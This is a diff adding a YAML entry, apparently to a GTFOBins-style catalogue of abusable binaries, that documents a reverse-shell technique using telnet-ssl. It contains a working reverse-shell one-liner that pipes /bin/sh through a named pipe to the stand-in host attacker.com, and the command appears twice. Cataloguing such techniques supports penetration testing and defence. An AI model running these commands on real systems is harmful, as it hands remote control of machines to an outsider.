@@ -1,0 +1,15 @@
+---
+comment: telnet-ssl can be abused to create reverse shells through a named pipe.
+functions:
+  reverse-shell:
+    - comment: Creates a reverse shell using telnet-ssl and a named pipe.
+      code: |
+        mkfifo /path/to/temp-socket
+        telnet-ssl attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+      tty: false
+      listener: TCP
+      contexts:
+        unprivileged:
+          code: |
+            mkfifo /path/to/temp-socket
+            telnet-ssl attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
